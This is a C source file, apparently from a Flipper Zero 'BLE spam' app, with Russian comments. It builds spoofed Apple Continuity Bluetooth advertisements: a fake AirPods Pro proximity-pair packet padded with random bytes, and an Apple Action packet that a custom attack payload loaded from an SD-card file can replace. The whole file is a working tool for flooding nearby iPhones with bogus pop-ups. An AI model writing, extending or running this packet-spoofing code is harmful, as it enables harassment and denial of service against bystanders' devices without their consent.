#include "continuity.h"
#include <storage/storage.h>

#define CUSTOM_PACKETS_PATH EXT_PATH("apps_data/ble_spam/apple_custom.txt")
#define MAX_CUSTOM_PAYLOAD_LEN 31

static uint8_t custom_payload[MAX_CUSTOM_PAYLOAD_LEN];
static uint8_t custom_payload_len = 0;

static uint8_t hex_to_byte(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static void load_custom_apple_packet(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    custom_payload_len = 0;
    
    if(storage_file_open(file, CUSTOM_PACKETS_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char buffer[128]; // Корректный массив-буфер для чтения строки атак
        uint16_t read = storage_file_read(file, buffer, sizeof(buffer) - 1);
        if(read > 0) {
            buffer[read] = '\0';
            char* hex_start = strchr(buffer, ':');
            if(hex_start) {
                hex_start++;
                while(*hex_start && custom_payload_len < MAX_CUSTOM_PAYLOAD_LEN) {
                    if(*hex_start == ' ' || *hex_start == '\r' || *hex_start == '\n') {
                        hex_start++;
                        continue;
                    }
                    if(*hex_start && *(hex_start + 1)) {
                        custom_payload[custom_payload_len] = (hex_to_byte(*hex_start) << 4) | hex_to_byte(*(hex_start + 1));
                        custom_payload_len++;
                        hex_start += 2;
                    } else {
                        break;
                    }
                }
            }
        }
    }
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static const char* protocol_continuity_get_name(const BleSpamMsg* msg) {
    if(msg->type == ContinuityTypeProximityPair) {
        return "Proximity Pair";
    } else if(msg->type == ContinuityTypeAppleAction) {
        return "Apple Action / Custom File";
    }
    return "Unknown";
}

static void protocol_continuity_make_packet(uint8_t* out_tx_data, uint8_t** out_tx_len_ptr, const BleSpamMsg* msg) {
    uint8_t i = 0;
    uint8_t* out_tx_len = *out_tx_len_ptr;

    if(msg->type == ContinuityTypeProximityPair) {
        out_tx_data[i++] = 0x4C;
        out_tx_data[i++] = 0x00;
        out_tx_data[i++] = 0x07;
        out_tx_data[i++] = 0x19;
        
        uint16_t model = 0x0E20; // AirPods Pro по дефолту
        
        out_tx_data[i++] = (model >> 8) & 0xFF;
        out_tx_data[i++] = model & 0xFF;
        out_tx_data[i++] = 0x20;
        out_tx_data[i++] = 0x10;
        out_tx_data[i++] = 0x42;
        out_tx_data[i++] = 0x04;
        while(i < 31) out_tx_data[i++] = rand() % 256;
        *out_tx_len = i;

    } else if(msg->type == ContinuityTypeAppleAction) {
        load_custom_apple_packet();
        if(custom_payload_len > 0) {
            // Перехватываем: пишем данные из файла
            memcpy(out_tx_data, custom_payload, custom_payload_len);
            *out_tx_len = custom_payload_len;
        } else {
            // Заводской дефолтный пакет, если файла нет на SD
            out_tx_data[i++] = 0x4C; out_tx_data[i++] = 0x00;
            out_tx_data[i++] = 0x0F; out_tx_data[i++] = 0x05;
            out_tx_data[i++] = 0xC1; out_tx_data[i++] = 0x01;
            out_tx_data[i++] = rand() % 256;
            out_tx_data[i++] = 0x00; out_tx_data[i++] = 0x00;
            *out_tx_len = i;
        }
    }
}

const BleSpamProtocol ble_spam_protocol_continuity = {
    .icon = &I_apple,
    .get_name = protocol_continuity_get_name,
    .make_packet = protocol_continuity_make_packet,
};
